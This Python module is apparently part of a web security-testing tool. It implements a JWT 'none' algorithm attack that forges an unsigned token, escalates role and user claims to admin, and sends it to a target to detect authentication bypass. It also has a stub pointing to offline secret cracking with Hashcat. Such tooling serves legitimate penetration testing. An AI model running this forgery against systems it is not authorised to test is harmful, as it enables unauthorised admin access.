from typing import Any, Dict
import base64
import json
from ..http_client import HttpClient
from ..scenarios import FlowScenario, SimpleScenario 
# Note: JWT attacks usually require a captured token, so this fits best in a Flow 
# OR a SimpleScenario where we explicitly provided a token in config. 
# But to make it "Real", we should modify an existing token.

def _b64url_encode(data: Dict) -> str:
    json_str = json.dumps(data, separators=(",", ":"))
    encoded = base64.urlsafe_b64encode(json_str.encode()).decode().rstrip("=")
    return encoded

def _decode_jwt(token: str):
    parts = token.split(".")
    if len(parts) != 3:
        return None, None
    try:
        header = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode())
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode())
        return header, payload
    except:
        return None, None

def run_jwt_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    JWT None Algorithm & Weak Signature Attack.
    Requires a valid 'base_token' in config (usually fetched in a previous flow step).
    """
    base_token = scenario.config.get("token")
    if not base_token or base_token.startswith("{{"):
        print("    [!] JWT: No token provided. Using dummy token to simulate attack logic.")
        # Dummy JWT: {"alg": "HS256", "typ": "JWT"} . {"user": "test"} . signature
        base_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.SIGNATURE"

    header, payload = _decode_jwt(base_token)
    if not header:
        return {
            "scenario_id": scenario.id,
            "passed": True, 
            "details": "Base token is not a valid JWT (cannot attack)"
        }
    
    issues = []
    leaked_data = [] # Evidence
    
    # ATTACK 1: The "None" Algorithm
    # Header: { "alg": "none" }
    # Signature: empty
    
    rogue_header = header.copy()
    rogue_header["alg"] = "none"
    
    # Escalate privileges if possible
    rogue_payload = payload.copy()
    if "role" in rogue_payload:
        rogue_payload["role"] = "admin"
    if "user" in rogue_payload:
        rogue_payload["user"] = "admin"
    if "admin" in rogue_payload:
        rogue_payload["admin"] = True
        
    fake_token = f"{_b64url_encode(rogue_header)}.{_b64url_encode(rogue_payload)}."
    
    # Send request with fake token
    # We need to know WHERE to put it. Authorization header usually.
    
    resp = client.send(
        scenario.method, 
        scenario.target, 
        headers={"Authorization": f"Bearer {fake_token}"}
    )
    
    # If 200 OK and we are NOT 401/403, it's a critical fail.
    # Check body for "admin" evidence if we tried to escalate.
    
    # Baseline Check: What does the server say WITHOUT the token?
    # If the endpoint is public (e.g. login/home), it returns 200 OK anyway.
    # We must ensuring the forged token actually changed the state.
    baseline_resp = client.send(scenario.method, scenario.target)

    if resp.status_code == 200:
        # If the attack response matches the baseline (ignoring small jitter like timestamps),
        # then the token was likely IGNORED, not accepted.
        # Simple length check difference > 5% or distinct keyword needed.
        
        is_suspicious = False
        evidence = []
        
        # Check for admin keywords that strictly shouldn't be there
        if "admin" in resp.text.lower() and "admin" not in baseline_resp.text.lower():
            evidence.append("Privilege Escalation: 'admin' found in response.")
            is_suspicious = True
        
        # Check if response code is better than baseline (e.g. 200 vs 401/403)
        elif baseline_resp.status_code in [401, 403]:
             evidence.append("Auth Bypass: Status 200 (Baseline was 401/403).")
             is_suspicious = True
             
        # If baseline was already 200, we need to be very careful.
        # Only report if content is significantly different.
        elif len(resp.text) != len(baseline_resp.text):
            # Very weak signal, might just be dynamic content. 
            # Let's skip reporting this unless we have better proof.
            # Real hackers prefer false negatives over false positives here.
            pass

        if is_suspicious:
            issues.append(
                f"\n    [CRITICAL] JWT 'None' Algorithm accepted!\n"
                f"    Forged Token: {fake_token}\n"
                f"    Response: {resp.status_code}\n"
                f"    Evidence: {', '.join(evidence)}"
            )
            leaked_data.append(f"Forged Token: {fake_token}")
            leaked_data.append(f"Evidence: {', '.join(evidence)}")
        
    return {
        "scenario_id": scenario.id,
        "attack_type": "jwt_weakness",
        "passed": len(issues) == 0,
        "details": {
            "issues": issues,
            "leaked_data": leaked_data
        }
    }

def run_jwt_brute(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    Checks if the JWT secret is weak (offline brute force simulation).
    In a real scenario, this would compute signatures. Here we warn if we suspect weak keys.
    """
    # This is a placeholder since pure Python brute forcing is slow and requires the token.
    # We will just verify if a token is present and alert the user to use Hashcat.
    return {
        "scenario_id": scenario.id,
        "attack_type": "jwt_brute",
        "passed": True,
        "details": "JWT Brute Force requires GPU tools (Hashcat). Use the captured token to crack offline."
    }
